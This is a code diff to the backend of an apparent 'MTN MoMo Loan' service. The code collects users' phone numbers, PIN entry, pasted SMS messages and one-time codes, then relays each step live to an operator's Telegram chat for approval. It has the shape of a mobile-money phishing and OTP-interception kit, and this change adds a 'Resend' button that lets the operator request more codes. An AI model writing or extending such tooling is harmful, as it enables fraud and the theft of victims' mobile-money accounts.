@@ -1,6 +1,6 @@
 /* ============================================================
    MTN MoMo Loan — Backend
-   - Live approve/reject via Telegram inline buttons
+   - Live approve/reject/resend via Telegram inline buttons
    - Frontend polls status endpoint
    - No DB (in-memory Map, auto-cleaned)
    - Fallback port: 5000 (Railway overrides via process.env.PORT)
@@ -13,7 +13,7 @@ const crypto = require('crypto');
 const app = express();
 
 /* ============================================================
-   CONFIG (from Railway environment variables)
+   CONFIG
    ============================================================ */
 const PORT = process.env.PORT || 5000;
 
@@ -25,13 +25,12 @@ const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}
 const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
 const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;
 
-/* Approval timeout: 10 minutes */
 const SESSION_TIMEOUT_MS = 10 * 60 * 1000;
-/* Cleanup interval: every 60 seconds, purge sessions older than 15 min */
 const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
 
 /* ============================================================
    IN-MEMORY SESSION STORE
+   status: 'pending' | 'approved' | 'rejected' | 'resend_requested' | 'timeout'
    ============================================================ */
 const sessions = new Map();
 
@@ -39,7 +38,7 @@ setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions.entries()) {
     const age = now - s.createdAt;
-    if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
+    if ((s.status === 'pending' || s.status === 'resend_requested') && age > SESSION_TIMEOUT_MS) {
       s.status = 'timeout';
       s.resolvedAt = now;
     }
@@ -90,7 +89,7 @@ function isValidPhone(phone) {
 }
 
 /* ============================================================
-   TELEGRAM — send message with inline keyboard
+   TELEGRAM — send message with inline keyboard (3 buttons)
    ============================================================ */
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
@@ -109,7 +108,8 @@ async function sendTelegramWithButtons(text, sessionId, step) {
         reply_markup: {
           inline_keyboard: [[
             { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` },
+            { text: '🔁 Resend',  callback_data: `resend:${step}:${sessionId}` }
           ]]
         }
       })
@@ -126,19 +126,26 @@ async function sendTelegramWithButtons(text, sessionId, step) {
   }
 }
 
-async function editTelegramMessage(messageId, text) {
+async function editTelegramMessage(messageId, text, keepButtons) {
   if (!messageId || !TELEGRAM_BOT_TOKEN) return;
   try {
+    const body = {
+      chat_id: TELEGRAM_CHAT_ID,
+      message_id: messageId,
+      text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    };
+
+    /* If keepButtons is a keyboard object, include it */
+    if (keepButtons) {
+      body.reply_markup = keepButtons;
+    }
+
     await fetch(TELEGRAM_EDIT_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        message_id: messageId,
-        text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      })
+      body: JSON.stringify(body)
     });
   } catch (err) {
     console.error('editTelegramMessage failed:', err.message);
@@ -160,6 +167,20 @@ async function answerCallback(callbackQueryId, text) {
   } catch (err) {
     console.error('answerCallback failed:', err.message);
   }
+}
+
+/* Rebuild a short summary line for editing */
+function summariseSession(session) {
+  if (session.step === 'login') {
+    return `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
+  }
+  if (session.step === 'sms') {
+    return `📱 ${escapeHtml(session.data.phone)} — SMS pasted`;
+  }
+  if (session.step === 'otp') {
+    return `📱 ${escapeHtml(session.data.phone)} — OTP ${escapeHtml(session.data.otp)}`;
+  }
+  return '';
 }
 
 /* ============================================================
@@ -313,7 +334,7 @@ app.post('/api/verify-otp', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/resend-sms
+   POST /api/resend-sms  (informational — separate from in-message 🔁 button)
    ============================================================ */
 app.post('/api/resend-sms', async (req, res) => {
   try {
@@ -349,7 +370,8 @@ app.get('/api/status/:sessionId', (req, res) => {
     return res.json({ ok: true, status: 'unknown', step: null });
   }
 
-  if (session.status === 'pending' && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
+  if ((session.status === 'pending' || session.status === 'resend_requested')
+      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
     session.status = 'timeout';
     session.resolvedAt = Date.now();
   }
@@ -362,7 +384,7 @@ app.get('/api/status/:sessionId', (req, res) => {
 });
 
 /* ============================================================
-   POST /api/telegram-webhook
+   POST /api/telegram-webhook  (handles ✅ ❌ 🔁)
    ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -383,11 +405,46 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    if (session.status !== 'pending') {
+    if (session.status === 'approved' || session.status === 'rejected' || session.status === 'timeout') {
       await answerCallback(cb.id, `Already ${session.status}`);
       return res.json({ ok: true });
     }
 
+    /* ==========================================================
+       🔁 RESEND
+       - updates status to 'resend_requested'
+       - edits the Telegram message to show "resend requested"
+       - keeps ✅/❌ buttons (drops 🔁 so it doesn't get tapped twice)
+       ========================================================== */
+    if (action === 'resend') {
+      session.status = 'resend_requested';
+      session.resendRequestedAt = Date.now();
+      await answerCallback(cb.id, '🔁 Resend requested');
+
+      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+      const summary = summariseSession(session);
+      const newText =
+        `🔁 <b>RESEND REQUESTED</b> — awaiting final decision\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `${summary}\n` +
+        `🕒 <b>Requested:</b> ${when}\n\n` +
+        `⏳ Tap ✅ or ❌ to finish`;
+
+      if (session.telegramMessageId) {
+        await editTelegramMessage(session.telegramMessageId, newText, {
+          inline_keyboard: [[
+            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+          ]]
+        });
+      }
+
+      return res.json({ ok: true });
+    }
+
+    /* ==========================================================
+       ✅ APPROVE  /  ❌ REJECT
+       ========================================================== */
     if (action === 'approve') {
       session.status = 'approved';
       session.resolvedAt = Date.now();
@@ -403,15 +460,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const statusLine = action === 'approve' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>';
     const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
-
-    let summary = '';
-    if (session.step === 'login') {
-      summary = `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
-    } else if (session.step === 'sms') {
-      summary = `📱 ${escapeHtml(session.data.phone)} — SMS pasted`;
-    } else if (session.step === 'otp') {
-      summary = `📱 ${escapeHtml(session.data.phone)} — OTP ${escapeHtml(session.data.otp)}`;
-    }
+    const summary = summariseSession(session);
 
     const newText =
       `${statusLine}\n` +
@@ -443,8 +492,7 @@ app.use((err, _req, res, _next) => {
 });
 
 /* ============================================================
-   AUTO-REGISTER TELEGRAM WEBHOOK ON START
-   ✅ FIXED: correct precedence, robust URL detection
+   AUTO-REGISTER TELEGRAM WEBHOOK
    ============================================================ */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) {
@@ -453,19 +501,14 @@ async function registerWebhook() {
     return;
   }
 
-  /* ✅ FIX: correctly determine the public URL */
   let publicUrl = process.env.PUBLIC_URL || '';
-
   if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
     publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
   }
-
-  /* Normalize — strip trailing slash */
   publicUrl = publicUrl.replace(/\/+$/, '');
 
   if (!publicUrl) {
-    console.warn('⚠️ Cannot register webhook — no PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
-    console.warn('   Set PUBLIC_URL=https://your-app.up.railway.app in Railway env vars.');
+    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
     global.__webhookStatus = 'missing_url';
     return;
   }
@@ -504,8 +547,6 @@ app.listen(PORT, async () => {
   console.log('💰 MTN MoMo Loan — backend running');
   console.log(`🚀 Port: ${PORT}`);
   console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
-  console.log(`🌐 PUBLIC_URL env: ${process.env.PUBLIC_URL || '(not set)'}`);
-  console.log(`🌐 RAILWAY_PUBLIC_DOMAIN env: ${process.env.RAILWAY_PUBLIC_DOMAIN || '(not set)'}`);
   console.log('====================================');
 
   setTimeout(registerWebhook, 2000);
